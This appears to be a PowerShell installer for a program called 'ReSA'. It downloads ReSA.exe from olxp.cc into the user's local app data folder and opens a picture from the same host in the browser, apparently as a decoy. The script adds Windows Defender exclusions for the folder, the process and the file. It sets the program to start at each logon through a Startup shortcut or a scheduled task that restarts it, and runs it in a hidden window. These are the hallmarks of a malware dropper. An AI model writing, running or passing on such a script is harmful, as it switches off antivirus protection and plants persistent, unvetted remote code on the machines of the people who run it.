# ReSA remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$Temp = Join-Path $env:TEMP "ReSA-download.exe"
$LogFile = Join-Path $env:TEMP "ReSA-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReSA-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReSA.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReSA.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Open-InBrowser {
    param([string]$Url)

    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    return $false
}

function Show-InstallPicture {
    param([string]$BaseUrl)

    $pictureUrl = $BaseUrl + "/picture_1963.webp"
    Write-InstallLog ("picture: " + $pictureUrl)

    if (Open-InBrowser -Url $pictureUrl) {
        Write-InstallLog ("picture opened in browser: " + $pictureUrl)
        return
    }

    $picFile = Join-Path $env:TEMP "ReSA-picture_1963.webp"
    try {
        if (Test-Path -LiteralPath $picFile) {
            Remove-Item -LiteralPath $picFile -Force -ErrorAction SilentlyContinue
        }
        Download-File -Url $pictureUrl -OutFile $picFile
        if (Test-Path -LiteralPath $picFile) {
            $fileUri = "file:///" + ($picFile -replace '\\', '/')
            if (Open-InBrowser -Url $fileUri) {
                Write-InstallLog ("picture opened in browser from local file: " + $fileUri)
                return
            }
        }
    } catch {
        Write-InstallLog ("picture fallback failed: " + $_.Exception.Message)
    }

    Write-InstallLog "picture launch skipped: no available browser"
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

Show-InstallPicture -BaseUrl $BaseUrl

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

$Url = $BaseUrl + "/ReSA.exe"
Write-InstallLog ("download: " + $Url)

if (Test-Path -LiteralPath $Temp) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $Temp
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $Temp)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $Temp).Length
if ($length -lt 1048576) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

if (Test-Path -LiteralPath $Exe) {
    Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
}

try {
    Move-Item -LiteralPath $Temp -Destination $Exe -Force
} catch {
    Fail-Install ("copy failed: " + $_.Exception.Message)
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

$startupOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    $startupOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $startupOk) {
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName "ReSA" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    Write-InstallLog "scheduled task ok"
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started"
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}

Write-InstallLog "install complete"
exit 0
